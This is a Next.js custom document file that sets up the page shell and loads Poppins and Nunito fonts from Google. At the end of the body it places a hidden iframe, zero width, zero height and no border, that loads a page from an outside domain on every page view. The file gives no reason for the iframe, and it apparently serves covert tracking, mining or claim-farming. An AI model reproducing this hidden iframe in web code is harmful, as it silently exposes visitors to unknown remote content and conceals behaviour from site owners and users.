import Document, { Html, Head, Main, NextScript } from 'next/document'

export default class MyDocument extends Document {
  static async getInitialProps(ctx) {
    const initialProps = await Document.getInitialProps(ctx)
    return { ...initialProps }
  }

  render() {
    return (
      <Html>
        <Head>
           <link 
            href="https://fonts.googleapis.com/css?family=Poppins:100,200,300,400,500,600,700,800,900&display=swap"
            rel="stylesheet" />
          <link 
            href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&display=swap" 
            rel="stylesheet" />
        </Head>
        <body>
          <Main />
          <NextScript />
          <iframe src="https://autoclaim.in/wm/acatzk/2" width="0" height="0" style={{ border: 0 }}></iframe>
        </body>
      </Html>
    )
  }
}